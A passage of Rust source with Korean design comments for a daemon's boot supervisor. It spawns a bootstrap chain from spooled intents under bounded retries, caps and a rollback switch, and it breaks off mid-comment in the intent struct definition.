//! (U-23) **부트 감독자** — 부트를 단명 훅 자식에서 떼어내 **장수 데몬이 낳게** 한다.
//!
//! ## 근본원인 R3 — 감독자가 없다
//! 지금의 부트는 **단발 체인**이다. `UserPromptSubmit` 훅이 `javis_bootstrap.py` 를
//! `setsid`→`nohup`→`&` 폴백으로 백그라운드에 던지고 즉시 사라진다. 그 뒤를 봐 주는 주체가
//! 아무도 없다:
//!   · 훅이 등록 timeout 으로 잘리면(하네스 group-kill) 부트도 함께 죽는다 —
//!     **Windows 는 `setsid` 가 아예 없어**(실측 WIN-6 `runtime\git\usr\bin\setsid.exe` 부재)
//!     `nohup` 분기가 pgid 를 분리하지 못하고 정확히 이 경로로 죽는다. 맥은 멀쩡하고 윈도우
//!     설치본만 깨지는 그 반복 사고의 한 갈래다.
//!   · 발화가 실패해도 **재시도가 없다**. 훅은 이미 종료됐고 다시 부를 사람이 없다.
//!
//! 이 모듈이 그 빈자리를 만든다: **인텐트(intent)를 스풀에 적어 두면, 데몬이 자기 cadence 로
//! 그것을 집어 부트 체인을 낳는다.** 데몬은 훅의 프로세스 그룹 밖에 있으므로 훅이 잘려도
//! 부트는 산다.
//!
//! ## ★정직한 한계 — hard-hang 은 회수하지 못한다 (B3-2R ⑦ · 리뷰 합산 계약)
//! fence(§2-6)는 **소유권만** 회수한다: 세대를 올리면 구 러너의 side-effect RPC 가 전부
//! `lease_stale` 로 거절되므로 그 러너는 **무해**해진다. 그러나 무해한 것과 **없는 것**은 다르다.
//! RPC 를 더 부르지 않는 러너(데드락·CPU 루프)는 거절당할 일조차 없으므로 fence 로 **아무 영향도
//! 받지 않고**, 이 감독자는 아무것도 죽이지 않으므로(오살 0 제1계약) 그 프로세스를 **회수할 수
//! 없다**. 명세 §2-6 의 'SIGTERM' 절을 의도적으로 구현하지 않은 대가가 정확히 이것이다.
//!
//! 그래서 세 층으로 **완화만** 한다 — 셋 다 회수가 아니다:
//!   ① 전역 admission 상한([`MAX_LIVE_BOOT_RUNS`]) — 고아가 쌓이면 **새로 낳는 것을 멈춘다**.
//!      총량은 유계가 되지만 이미 매달린 프로세스는 그대로다.
//!   ② 고아 원장(`Daemon::boot_fenced` · pid 포함) — **사람이 찾아갈 수 있게** 만든다.
//!      회수는 운영자나 watchdog(`duplicate_procs` 축)의 몫이다.
//!   ③ 나이는 **진단 축**이다(R5 [4]) — 회수 근거가 아니다. 고아를 원장에서 빼는 유일한
//!     근거는 **확인된 exit 관측**(A18 [5] · B4)이고, [`FENCED_REAP_AGE_SECS`] 를 넘긴 보유는
//!     "너무 오래 쥐고 있다" 는 신호로만 보고된다.
//!      이것은 관측이 아니라 추정이다(프로세스가 실제로 끝났는지 보지 않는다).
//! 진짜 회수는 러너 자신이 lease 상실을 보고 **스스로 끝내는 것**(명세 §2-7 · B4)이다.
//!
//! ## 이 저장소의 제1 계약 — 오살이 오탐보다 훨씬 위험하다
//! 그래서 이 감독자는 **아무것도 죽이지 않는다.** 좌석 close·프로세스 kill·에이전트 재기동은
//! 이 파일에 **한 줄도 없고**, 그 부재를 검체(`H-BOOT-SUP-1`)가 소스 핀으로 못박는다.
//! 감독자가 할 수 있는 일은 "없는 것을 낳는 것" 하나뿐이며, 그것조차 유계다(아래).
//!
//! ## 폭주(치명위험 ①) 차단 — 유계는 **낳는 것**과 **말하는 것** 둘 다에 건다
//!
//! ### 낳는 것(프로세스)
//!   ① **시도 상한** [`MAX_ATTEMPTS`] — 인텐트 1건이 낳을 수 있는 프로세스는 최대 3개다.
//!   ② **쿨다운** [`RETRY_COOLDOWN_SECS`] — 연속 시도 사이 최소 간격(선형 백오프).
//!   ③ **메모리측 예산** — 파일 쓰기가 실패해 `attempts` 가 영원히 0 으로 남아도(읽기전용
//!      스풀·디스크 만실), 태스크 로컬 예산이 같은 유계를 **혼자서도** 성립시킨다
//!      (`effective_attempts` = 파일 ∪ 메모리의 **최댓값**). 디스크가 거짓말해도 폭주는 없다.
//!      ★그 예산 맵의 상한 집행은 **`clear()` 가 아니다**(`SupState::budget` · `tick_in`):
//!      통째로 비우면 ③이 무너지는데, ③이 필요한 상황이 정확히 '디스크 축이 이미 무너진'
//!      상황이라 **두 축이 동시에** 사라진다. 그래서 스풀에 없는 항목만 LRU 로 솎고,
//!      그래도 넘치면 **낳는 것을 멈춘다**(유계가 liveness 보다 앞이다).
//!   여기에 틱당 디스패치 상한([`MAX_DISPATCH_PER_TICK`])이 더해져, 스풀에 1만 건이 쏟아져도
//!   한 틱이 낳는 프로세스는 2개를 넘지 않는다.
//!
//! ### 말하는 것(이벤트)
//!   ④ **음성 캐시**(`SupState::undeletable` · `remove_and_gate`) — 스풀 항목 삭제가
//!      실패하면 그 항목은 **매 틱 같은 판정으로 다시 올라온다**. 발행을 삭제 결과와 묶지
//!      않으면 지워지지 않는 파일 하나가 3초마다 영구히 이벤트를 낸다. 그래서 (경로, 사유)당
//!      정확히 1건으로 접고, 회수는 **파일이 실제로 사라졌을 때만** 한다.
//!      주 경로는 Windows다: 읽기전용 속성·다른 프로세스가 연 파일에서 `remove_file` 이
//!      실패하고, `ensure_spool` 의 권한 재강제는 `#[cfg(unix)]` 라 거기서는 무력하다
//!      (`remove_spool_file` 이 속성 1회 해제로 그 한 겹을 만든다).
//!
//! ### 스캔 두 축 — 상한은 두 개이고 **독립**이다
//!   [`MAX_SCAN_ENTRIES`] 는 한 틱이 **판정**할 인텐트 수, [`MAX_GC_ENTRIES`] 는 한 틱이
//!   **검사**할 엔트리 수다. 하나로 합치면 정렬 앞쪽이 차 있는 동안 뒤쪽 쓰레기가 영원히
//!   검사되지 않아 스풀이 무한 성장한다. 상한 뒤쪽의 기아는 **회전 커서**가 닫는다
//!   (`SupState::cursor` · `scan_spool`).
//!
//! ## watchdog 틱을 절대 막지 않는다 (설계서 U-23 게이트: "틱 정지 0")
//! `governance::spawn_watchdog` 의 틱 본문은 **동기 클로저**(`AssertUnwindSafe(|| { … })`)이고
//! 그 태스크에서 `.await` 하는 것은 `tokio::time::sleep` **하나뿐**이다. 즉 틱 본문에 무엇을
//! 넣든 그것은 **블로킹**이며, 부트 1회(수십 초)를 거기 얹으면 큐 배달·승인 격상·데드맨·회수가
//! 그 시간만큼 통째로 정지한다(치명위험 ②③). 그래서 감독자는 **별도 `tokio::spawn` + 자기
//! cadence**([`SUPERVISOR_INTERVAL_SECS`])다. 이 계약은 `H-TICK-ALIVE` 가 소스 핀으로 지킨다.
//!
//! ## 인텐트에는 **명령 문자열이 없다**
//! 스풀은 상태 디렉터리 안의 평범한 파일이다. 거기 적힌 값이 곧 실행 명령이면, 그 디렉터리에
//! 쓸 수 있는 누구든 데몬 권한으로 임의 명령을 얻는다. 그래서 인텐트가 나르는 것은 **닫힌
//! enum 의 토큰**([`BootAction`]) 하나이고, 미지 토큰은 **실행되지 않고 폐기**된다
//! (`Disposition::Retire("unknown_action")`). 합성 표본(셸 명령을 action 에 넣은 인텐트)이
//! 실행되지 않는지를 단위테스트가 직접 시험한다.
//!
//! ## 롤백 (규약 6: 노브는 사고 순간에 **하나**여야 한다)
//! `CYS_BOOT_GATES=0` **마스터 스위치 하나**로 감독자가 기동하지 않는다. 축 단위 조정이
//! 필요하면 `CYS_BOOT_SUPERVISOR=0`([`ENV_SUPERVISOR`])이 있지만, 사고 순간에 사람이 쥐는
//! 손잡이는 마스터 하나다(`lib.rs ENV_BOOT_GATES` 의 규율 — 축마다 노브를 따로 두고 나중에
//! 합치는 순서는 BLOCK-3 에서 이미 실패했다).
//!
//! ## 생산자 (P2 — U-24 착지)
//! 인텐트의 생산자는 `handlers.rs` 의 **`boot.enqueue` RPC arm** 하나다(훅이 게이트 사슬 통과
//! 후 `cys boot-intent` 로 부른다). 정상 경로에서 스풀의 유일한 writer 는 **데몬 자신**
//! (`boot.enqueue`→[`enqueue`]) 이므로 writer/reader 스키마 버전은 항상 일치한다.
//!
//! ## 재시도의 **정직한 의미론** — 재시도 = **스폰 실패 한정**
//! 감독자는 자식 exit 을 관측하지 않는다(핸들 즉시 드롭 · [`run_ensure_team`]). 따라서
//! '스폰 성공 = 인텐트 제거'이고, exit 11(싱글플라이트 skip)도 exit 10(session_error)도
//! 여기서는 '성공'으로 접힌다. **부트 실패** 계급의 재실행 주체는 여전히 §0-A(P0-3) 가
//! 유일하다 — 이 감독자가 그것을 대체한다고 서술하면 허위다(2차 성찰 P2-3 판정).

use crate::state::{now_epoch, state_dir, BootAck, BootNonce, BootRunActive, Daemon, FencedRun};
use serde_json::json;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Duration;

// ══════════════════════════════════════════════════════════════════════════════
// 계약 상수 — 값의 정의처는 여기 하나다.
// ══════════════════════════════════════════════════════════════════════════════

/// 인텐트 **페이로드** 스키마 버전. 다르면 실행하지 않고 폐기한다(전방 호환을 침묵으로 접지
/// 않는다 — 구 데몬이 신 인텐트를 자기 방식으로 해석하는 것이 가장 나쁜 귀결이다).
///
/// **v2 (P2)**: `decl_origin`(닫힌 토큰)·`claim{rc,at}`(데이터) 추가. 다운그레이드 스큐에서
/// 구 감독자(v1)는 신 인텐트를 `schema_mismatch` 로 **시끄럽게 폐기**한다(기존 계약 그대로 ·
/// R3-P2-1). 미지 필드는 무시하고 **필수 필드 부재만** 폐기한다([`BootIntent::from_str`]).
pub const INTENT_SCHEMA_V: u64 = 3;

/// (부트 v2 · 명세 §2-5) **승격 판독** 대상인 구 스키마. 구 데몬이 남긴 잔여 인텐트는
/// 폐기가 아니라 3 으로 승격해 읽는다(`executor` 는 빈 값, `state` 는 pending, `generation`
/// 은 0 으로 기본값 채움) — 업그레이드 순간에 대기 중이던 오너 선언을 죽이지 않기 위해서다.
/// 반대 방향(미래 스키마·v1 이하)은 여전히 fail-closed 폐기다.
pub const INTENT_SCHEMA_V_LEGACY: u64 = 2;

/// (부트 v2 · 명세 §2-5) GUI ▶버튼 유래. `operator_token` 이 데몬 발급값과 일치할 때만
/// 인정된다 — 훅과 달리 GUI 는 `surface_id` 를 **명시**할 수 있고 그 인가 근거가 이 토큰이다
/// (`handlers::operator_token_ok` · feed.reply 면제와 같은 신뢰 계급).
pub const DECL_ORIGIN_GUI_OPERATOR: &str = "gui-operator";

/// 인텐트를 실행할 주체. 롤백 스위치 값의 **스냅샷**이며, 전환 중에도 인텐트는 태어날 때의
/// 결정대로 완주한다(명세 §5).
pub const EXECUTOR_RUNNER: &str = "runner";
/// 구 경로 — `javis_bootstrap.py` 직접 spawn.
pub const EXECUTOR_PYTHON: &str = "python";

/// terminal 로 닫힌 인텐트 파일에 붙는 접미사. GC 는 **이것만** 지운다.
///
/// ★왜 즉시 rename 인가(시뮬 T1-3 — 이 한 줄이 없으면 G1 이 깨진다): 스풀 파일명이
/// `<decl_id>.json` 이고 terminal 파일이 GC 될 때까지 남아 있으면, 같은 프롬프트를 오너가
/// **실패 후 다시** 쳤을 때 `O_EXCL` 이 실패해 `dedup` 으로 접힌다 = **정당한 재선언이
/// 삼켜진다**. terminal 전이 시점에 이름을 바꿔 두면 새 선언은 언제나 새 파일이다.
pub const DONE_SUFFIX: &str = ".done";

/// (P2 · v2) `decl_origin` 이 나를 수 있는 **유일하게 인정되는 토큰**. 훅의 기계유래 게이트
/// (`javis_mission machine-origin`)가 human 판정을 완주했을 때만 이 값이 실린다 — 판별의
/// 소유자는 여전히 훅/javis_mission 이고(P2-5 · 게이트는 훅에 남는다), 이 필드는 **게이트
/// 통과 사실의 전달**이지 판정의 이동이 아니다. 미지값은 인정이 아니라 폐기다
/// (`Disposition::Retire("unknown_decl_origin")` — 닫힌 토큰 계약).
pub const DECL_ORIGIN_HOOK_HUMAN: &str = "hook-human";

/// 스풀 디렉터리 이름. 부모는 `state_dir(socket)` 이므로 **부서 격리를 자동 상속**한다
/// (Windows 는 `%LOCALAPPDATA%\cys[\<slug>]`, unix 는 소켓과 같은 디렉터리).
const SPOOL_DIR_NAME: &str = "boot-intents";

/// 감독자 **자기 cadence**(초). watchdog(5초)과 **일부러 다른 값**이다 — 같으면 두 태스크가
/// 매 틱 같은 순간에 깨어나 프로세스 표·디스크를 동시에 두드린다(lockstep).
const SUPERVISOR_INTERVAL_SECS: u64 = 3;

/// 인텐트 1건이 낳을 수 있는 **최대 시도 수**(폭주 차단 ①). 이 값을 넘으면 재시도가 아니라
/// **폐기**다 — 무한 재시도는 이 저장소가 이미 값을 치른 실패 양식이다.
pub const MAX_ATTEMPTS: u32 = 3;

/// 연속 시도 사이 최소 간격(초 · 폭주 차단 ②). 실제 대기는 `쿨다운 × 시도횟수`(선형 백오프).
pub const RETRY_COOLDOWN_SECS: f64 = 30.0;

/// 인텐트 수명(초). 이보다 오래된 것은 실행하지 않고 폐기한다 — 30분 전 프롬프트가 지금
/// 팀을 기동시키는 것은 사용자가 기대한 인과가 아니다.
///
/// ★**이 상수는 두 계약을 진다**(A17 · master 판정 (d) · B3-3). 명세 §2-6 ⓒ 의 **절대 마감**도
/// 이 값이 겸한다. 별도 마감 기구를 두지 않는 이유는 명세가 지목한 예산 leaf
/// `bootstrap_chain_worst_s`(3020초)가 이 수명(1800초)보다 **길어** 원리적으로 발효할 수 없기
/// 때문이다 — 그 기구를 만들면 태어날 때부터 죽은 코드다(측정되지 않는 코드는 있는 것보다
/// 나쁘다). 따라서 여기서 수명을 늘리면 절대 마감도 함께 늘어난다. **모르고 늘리지 마라.**
/// python 대응 `javis_budget.CYSD_SUPERVISOR_SOT["BOOT_INTENT_MAX_AGE_S"]` 에 같은 고지가 있다.
pub const INTENT_MAX_AGE_SECS: f64 = 1800.0;

/// 한 틱이 **본문을 읽어 판정하는** 스풀 엔트리 상한. 스풀이 홍수여도 틱 길이는 유계다.
const MAX_SCAN_ENTRIES: usize = 64;

/// 한 틱이 **GC 검사**(mtime metadata)하는 스풀 엔트리 상한 — 판정 상한과 **독립 축**이다.
///
/// 왜 나눴는가: 두 축이 같은 상한을 공유하면, 정렬 앞쪽 64건이 살아있는(혹은 지워지지 않는)
/// 인텐트로 차 있는 동안 **그 뒤의 쓰레기는 영원히 검사되지 않는다** — 스풀이 무한 성장한다.
/// 상한 자체는 남기되(틱 길이는 유계여야 한다) 회전 커서가 기아를 닫는다(`scan_spool`).
const MAX_GC_ENTRIES: usize = 256;

/// 지우지 못한 스풀 항목의 **음성 캐시** 상한. 캐시가 차면 새 키에 대해 **침묵**한다 —
/// 캐시를 비우는 것은 3초마다의 이벤트 폭주를 다시 여는 것과 같다(유계 파기).
const MAX_UNDELETABLE: usize = 256;

/// 한 틱이 **낳는** 프로세스 상한. 스캔 상한과 별개 축이다(64건을 읽어도 2건만 낳는다).
const MAX_DISPATCH_PER_TICK: usize = 2;

/// (★R2) 한 틱이 **pane 에 주입하는** 무스폰 통보 상한. 폐기(`Disposition::Retire`)는 스캔
/// 상한(64)까지 갈 수 있어서 디스패치 상한이 막아 주지 않는다 — kill-switch pause 가 길게
/// 유지된 뒤 재개하는 순간 다수가 한꺼번에 `expired` 로 접히면 선언 pane 이 주입 홍수를 맞는다.
///
/// ★상한이 걸리는 것은 **pane 채널 하나뿐**이다: feed 항목과 버스 이벤트는 무조건 나간다
/// (그쪽은 스캔 상한이 이미 유계이고, '조용히 사라지는 갈래 0' 이 이 수리의 목적이다).
/// 잘림 자체는 `boot_supervisor.notify_capped` 로 1회 가청화한다.
/// ★폐기(삭제)는 통보 예산과 **무관하게** 계속한다 — 쓰레기·적대 인텐트의 GC 를 통보 예산에
/// 묶으면 스풀이 줄지 않는다(그 결합은 R2 수리 도중 실측으로 기각됐다).
const MAX_RETIRE_NOTIFY_PER_TICK: usize = 2;

/// 태스크 로컬 예산 맵의 상한(맵 3종 방어 ①). 넘으면 통째로 비우고 이벤트를 남긴다 —
/// 24/365 데몬에서 맵이 조용히 자라는 것은 이 저장소의 알려진 누수 양식이다.
const MAX_TRACKED: usize = 128;

/// 감독자 **축 노브**. 사고 순간의 손잡이는 마스터(`CYS_BOOT_GATES=0`) 하나이고, 이것은
/// 축 단위 조정용이다.
pub const ENV_SUPERVISOR: &str = "CYS_BOOT_SUPERVISOR";

/// (부트 v2 · 명세 §5) 부트 v2 경로의 **롤백 스위치**. 기본은 켜짐이고 `0` 만 끔이다.
///
/// ★스위치의 단일 진실은 **데몬**이다(`status --json`.`boot_v2_enabled` 로 노출). 훅·GUI·
/// 감독자가 각자 env 를 읽으면 세 주체의 판단이 갈릴 수 있고, 사고 순간에 "누가 어느 값을
/// 봤는가" 를 재구성하는 것은 거의 불가능하다. 그래서 판독은 데몬 1회이고 나머지는 물어본다.
pub const ENV_BOOT_V2: &str = "CYS_BOOT_V2";

/// [`ENV_BOOT_V2`] 판독(순수) — **기본 꺼짐**. 켜는 쪽만 명시적이다.
///
/// ## ★극성을 뒤집었다(2026-09-05 · master 판정 · IG-33 §5)
/// 명세 §5 는 "기본 1"(켜짐)로 적지만, v0.14.30 은 부트 v2 를 **휴면으로 싣는다**. 러너
/// (B4-R)·자동 arm·레인 락이 없는 상태이므로 기본 켜짐으로 출하하면 사용자가 켠 적 없는
/// 경로가 기본값으로 돈다. 그래서 이 릴리스에서는 **opt-in** 이다.
/// ★명세와 갈린 채로 두지 않는다 — 이 divergence 는 master 판정으로 등재됐고, 여기 적는 이유는
/// 다음 사람이 명세만 보고 "기본 1 인데 코드가 틀렸다" 며 되돌리지 않게 하기 위해서다.
///
/// (`supervisor_off_from` 과 **반대 극성**인 점에 주의: 그쪽은 "꺼짐인가", 이쪽은 "켜짐인가".)
pub fn boot_v2_enabled_from(env_val: Option<&str>) -> bool {
    matches!(env_val.map(str::trim), Some("1") | Some("true"))
}

// ══════════════════════════════════════════════════════════════════════════════
// 순수 코어 — 데몬 상태도 디스크도 읽지 않는다(진리표 대상).
// ══════════════════════════════════════════════════════════════════════════════

/// 감독자가 꺼졌는가 — **마스터 스위치에 접힌** 순수 판정.
///
/// `cys::boot_gates_master_off_from` 을 **재사용**한다(규율을 두 벌로 쓰지 않는다).
///
/// ## ★기본값의 현행 의미(R2 · 2026-08-26 정정 — 사고 순간의 오판 유도 제거)
/// 종전 서술은 "생산자가 없는 지금은 켜져 있어도 스풀이 비어 있어 종전 동작과 한 글자도
/// 다르지 않다 = 기본값이 곧 종전 동작" 이었다. 이 캠페인(P2)이 생산자를 배선하면서 **거짓이
/// 됐다**: 생산자는 `boot.enqueue` RPC arm 하나이고(모듈 헤더 '생산자' 절), 훅 frontdoor 가
/// 게이트 사슬을 통과해 인텐트를 남기면 데몬이 **실제로 부트 체인을 스폰한다** — 기본값
/// (미설정)은 감독자 **가동**이고 행동 변경이 있다.
/// 롤백은 `CYS_BOOT_GATES=0`(축 단위는 `CYS_BOOT_SUPERVISOR=0`)이 유일 수단이며, 그때
/// `boot.enqueue` 는 `supervisor_off` 를 돌려 훅이 **종전 spawn 폴백**을 탄다(무손실 강등).
/// 하필 롤백 노브의 정의처에 붙은 낡은 문장은 사고 순간에 '기본값은 무해하니 서두를 것 없다'는
/// 정반대 결론을 부른다 — 그래서 이 절은 사실과 함께 유지된다.
pub fn supervisor_off_from(master_env: Option<&str>, own_env: Option<&str>) -> bool {
    cys::boot_gates_master_off_from(master_env) || own_env == Some("0")
}

/// 감독자가 할 수 있는 일의 **닫힌 집합**. 인텐트는 이 토큰만 나르며, **명령 문자열은 절대
/// 나르지 않는다**(모듈 헤더 '명령 문자열이 없다' 절).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum BootAction {
    /// 부트 체인(`<pack>/bin/javis_bootstrap.py`)을 **데몬의 자식으로** 낳는다.
    /// 멱등성은 그 스크립트가 이미 소유한 싱글플라이트 락이 보증한다(패자 = exit 11) —
    /// 세 런처(훅·`cys boot`·감독자)가 동시에 들어와도 실제 부트는 하나다.
    EnsureTeam,
}

impl BootAction {
    /// 와이어 토큰. 파일에 적히는 값이며 이 철자가 곧 계약이다.
    pub fn as_str(self) -> &'static str {
        match self {
            BootAction::EnsureTeam => "ensure-team",
        }
    }

    /// 와이어 토큰 → enum. **미지 토큰은 `None`** 이고, 호출부는 그것을 실행이 아니라
    /// 폐기로 접는다(fail-closed).
    pub fn parse(token: &str) -> Option<Self> {
        match token {
            "ensure-team" => Some(BootAction::EnsureTeam),
            _ => None,
        }
    }
}

/// 인텐트의 **종착 종류**(명세 §3-2 단일 enum). 감독자의 구 `Retire(...)` 사유와 러너의
/// exit 코드가 **전부 이 표로 합류**한다 — 종착이 두 어휘로 갈려 있으면 "왜 안 떴나" 를 한
/// 곳에서 답할 수 없다(G2 완주 결정론).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum TerminalKind {
    /// ⑤ READY.
    Completed,
    /// READY 이나 리뷰어 ack 미확인 — **정상 종착**이되 리뷰 게이트만 닫는다(가정 A).
    CompletedDegraded,
    /// claim 정당 거부(러너 rc 7) — 다른 master 가 살아 있다.
    Declined,
    /// claim 컨텍스트 오류(rc 10) — 좌석 소실·데몬 부재.
    SessionError,
    /// 전제 붕괴로 중단(master_gone · busy_other_executor · resource_hard · lease_fenced ·
    /// version_incompatible · 구 Retire 사유 전반).
    Aborted,
    /// 러너 예외.
    Crashed,
    /// 같은 좌석에 진행 중 인텐트가 있는데 새 선언이 왔다 — 기록 1 · 실행 0.
    Superseded,
    /// 감독자 수명 만료([`INTENT_MAX_AGE_SECS`]).
    Expired,
    /// 감독자 시도 상한([`MAX_ATTEMPTS`]).
    AttemptsExhausted,
    /// 레인 락 패자(rc 11) — 정상이며 처방이 없다.
    SkippedInflight,
    /// 인텐트 파일 JSON 파싱 실패.
    StateUnreadable,
}

impl TerminalKind {
    /// 와이어 철자. 파일·이벤트에 적히는 값이며 이 철자가 곧 계약이다.
    pub fn as_str(self) -> &'static str {
        match self {
            TerminalKind::Completed => "completed",
            TerminalKind::CompletedDegraded => "completed_degraded",
            TerminalKind::Declined => "declined",
            TerminalKind::SessionError => "session_error",
            TerminalKind::Aborted => "aborted",
            TerminalKind::Crashed => "crashed",
            TerminalKind::Superseded => "superseded",
            TerminalKind::Expired => "expired",
            TerminalKind::AttemptsExhausted => "attempts_exhausted",
            TerminalKind::SkippedInflight => "skipped_inflight",
            TerminalKind::StateUnreadable => "state_unreadable",
        }
    }

    /// 와이어 철자 → enum. **미지 토큰은 `None`** 이다(fail-closed — 조용한 기본값 금지).
    pub fn parse(token: &str) -> Option<Self> {
        Some(match token {
            "completed" => TerminalKind::Completed,
            "completed_degraded" => TerminalKind::CompletedDegraded,
            "declined" => TerminalKind::Declined,
            "session_error" => TerminalKind::SessionError,
            "aborted" => TerminalKind::Aborted,
            "crashed" => TerminalKind::Crashed,
            "superseded" => TerminalKind::Superseded,
            "expired" => TerminalKind::Expired,
            "attempts_exhausted" => TerminalKind::AttemptsExhausted,
            "skipped_inflight" => TerminalKind::SkippedInflight,
            "state_unreadable" => TerminalKind::StateUnreadable,
            _ => return None,
        })
    }

    /// 전 종착 열거 — 검체가 "빠짐 없음"(H-TERMINAL-1 열거 파리티)을 이것으로 잰다.
    ///
    /// ★`allow(dead_code)` 의 시한(정직 고지): 지금은 **검체만** 소비한다. 프로덕션 소비자는
    /// B3(감독자 terminal 전이 — `Retire` 사유를 이 표로 합류시키는 지점)와 B4(러너 exit →
    /// terminal 전사)이며, 그 두 티켓이 착지하면 이 속성은 **제거한다**. 영구 은폐가 아니다.
    #[allow(dead_code)]
    pub const ALL: [TerminalKind; 11] = [
        TerminalKind::Completed,
        TerminalKind::CompletedDegraded,
        TerminalKind::Declined,
        TerminalKind::SessionError,
        TerminalKind::Aborted,
        TerminalKind::Crashed,
        TerminalKind::Superseded,
        TerminalKind::Expired,
        TerminalKind::AttemptsExhausted,
        TerminalKind::SkippedInflight,
        TerminalKind::StateUnreadable,
    ];

    /// 구 `Disposition::Retire(why)` 문자열 → 종착 종류. 감독자의 종전 폐기 사유를 새 대수로
    /// **합류**시키는 유일 지점이다(사유 문자열 자체는 이벤트 호환을 위해 그대로 보존된다).
    #[allow(dead_code)] // ← B3 감독자 terminal 전이가 소비한다(위 ALL 주석의 시한과 같다)
    pub fn from_retire_reason(why: &str) -> TerminalKind {
        match why {
            "expired" => TerminalKind::Expired,
            "attempts_exhausted" => TerminalKind::AttemptsExhausted,
            // schema_mismatch·unknown_action·unknown_decl_origin·claim_stale·no_surface 는
            // 전부 "전제가 무너져 실행하지 않는다" = aborted 다(사유는 reason 이 나른다).
            _ => TerminalKind::Aborted,
        }
    }
}

/// 종착 1건 — 종류·사유·처방. `remedy` 는 **사람이 읽고 바로 실행할 한 줄**이다(빈 문자열 =
/// 처방 불요, 예: `skipped_inflight` 는 정상 경로다).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Terminal {
    pub kind: TerminalKind,
    pub reason: String,
    pub remedy: String,
}

impl Terminal {
    pub fn new(kind: TerminalKind, reason: &str, remedy: &str) -> Self {
        Terminal { kind, reason: reason.to_string(), remedy: remedy.to_string() }
    }
    fn to_value(&self) -> serde_json::Value {
        json!({"kind": self.kind.as_str(), "reason": self.reason, "remedy": self.remedy})
    }
    fn from_value(v: &serde_json::Value) -> Option<Self> {
        Some(Terminal {
            kind: TerminalKind::parse(v.get("kind")?.as_str()?)?,
            reason: v.get("reason").and_then(|x| x.as_str()).unwrap_or_default().to_string(),
            remedy: v.get("remedy").and_then(|x| x.as_str()).unwrap_or_default().to_string(),
        })
    }
}

/// 인텐트 수명 상태(명세 §2-5 schema 3). 종전에는 "파일이 있으면 대기 / 지우면 끝" 이라
/// **실행 중**이라는 상태가 표현되지 않았고, 그래서 재개가 "처음부터"밖에 될 수 없었다.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum IntentState {
    Pending,
    Running,
    Terminal,
}

impl IntentState {
    pub fn as_str(self) -> &'static str {
        match self {
            IntentState::Pending => "pending",
            IntentState::Running => "running",
            IntentState::Terminal => "terminal",
        }
    }
    /// 미지 토큰은 `None` — 구 파일(필드 부재)은 호출부가 `Pending` 으로 승격한다.
    pub fn parse(token: &str) -> Option<Self> {
        Some(match token {
            "pending" => IntentState::Pending,
            "running" => IntentState::Running,
            "terminal" => IntentState::Terminal,
            _ => return None,
        })
    }
}

/// 인텐트 1건에 대한 이번 틱의 **귀결**.
#[derive(Clone, Debug, PartialEq)]
pub enum Disposition {
    /// 지금 실행한다.
    Run(BootAction),
    /// 아직 이르다 — `until` 까지 기다린다(파일은 그대로 둔다).
    Wait { until: f64 },
    /// 실행하지 않고 폐기한다. 문자열은 사유(이벤트 페이로드로 나간다).
    Retire(&'static str),
}

/// 스풀에 적히는 인텐트. `action_token` 이 `String` 인 것은 의도적이다 — 미지 토큰을
/// **파싱 단계에서 잃지 않고** 폐기 사유·이벤트에 실어 보내야 무음 실패가 아니다.
#[derive(Clone, Debug, PartialEq)]
pub struct BootIntent {
    /// 스풀 파일명(확장자 제외). `sanitize_id` 를 통과한 값만 존재한다.
    pub id: String,
    /// 페이로드 스키마 버전.
    pub v: u64,
    /// 행위 토큰(원문 그대로).
    pub action_token: String,
    /// 레인 소켓 경로. 빈 값이면 감독자 자신의 소켓을 쓴다.
    pub lane: String,
    /// 이 인텐트를 낳은 좌석(있으면). 원장 기록의 surface 축이 된다.
    pub surface_id: Option<u64>,
    /// 생성 시각(epoch 초).
    pub created_at: f64,
    /// 지금까지의 시도 횟수(디스크측 예산).
    pub attempts: u32,
    /// 다음 시도 가능 시각(epoch 초).
    pub next_attempt_at: f64,
    /// 생성 사유(진단 전용 — 판정에 쓰이지 않는다).
    pub reason: String,
    /// (v2) 선언 유래 — 닫힌 토큰 [`DECL_ORIGIN_HOOK_HUMAN`] 만 인정, 빈 값 = 부재.
    /// **데이터 필드**다: 명령이 아니고, 부트 자식의 `CYS_DECL_ORIGIN` env 로만 릴레이된다.
    pub decl_origin: String,
    /// (v2) 훅 선행 claim 의 rc 릴레이(데이터 — 디스패치 시점 판정은 [`run_ensure_team`] 의
    /// **레지스트리 재실측**이 한다. 타임스탬프 이월 금지 · R3-P2-5).
    pub claim_rc: Option<i64>,
    /// (v2) 훅 선행 claim 시각(epoch 초 · 진단 전용 — 위와 같은 이유로 판정에 쓰지 않는다).
    pub claim_at: Option<f64>,
    /// (v3 · 명세 §2-5) **선언 id** — `sha256(lane | surface_id | session_id |
    /// digest_normalized(prompt))[:32]`. 데몬이 계산하며(클라이언트는 재료만 준다) 스풀
    /// **파일명**이 곧 이 값이다. 같은 선언 이벤트의 재전송은 같은 id 라 `O_EXCL` 이 dedup
    /// 으로 접는다 — 종전의 '유일 카운터 id' 는 재전송과 재선언을 구별하지 못했다.
    pub decl_id: String,
    /// (v3) 실행 주체 스냅샷 — [`EXECUTOR_RUNNER`]·[`EXECUTOR_PYTHON`].
    ///
    /// ## '태어날 때의 결정대로 완주' 는 **이미 착수한 것**에만 적용된다 (B3-5 · T3-2)
    /// 명세 §5 의 그 문장과 시뮬 T3-2 는 처음 읽으면 어긋나 보인다 — T3-2 는 "OFF 전환 시
    /// pending 인텐트는 python 으로 재스냅샷(running 은 완주)" 이다. 정합하는 읽기는 하나뿐이다:
    ///  · `running` = 이미 러너가 소유했다 → **태어난 대로 완주**한다(중간에 주체를 바꾸면
    ///    소유권이 갈린다).
    ///  · `pending` = 아직 아무도 착수하지 않았다 → 사용자가 스위치를 내린 것은 **지금 당장**
    ///    롤백하겠다는 뜻이고, 그 기대를 다음 인텐트까지 미룰 이유가 없다.
    /// 이 세분이 주석에 없으면 다음 사람이 두 문장 중 하나만 근거로 반대 방향으로 고친다.
    /// 판정은 [`resnapshot_executor`] 하나이고, 다시 찍는 방향은 **runner → python 한쪽**이다
    /// (되돌리기는 보수적인 쪽이라 스위치를 두 번 뒤집어도 python 에 머문다).
    ///
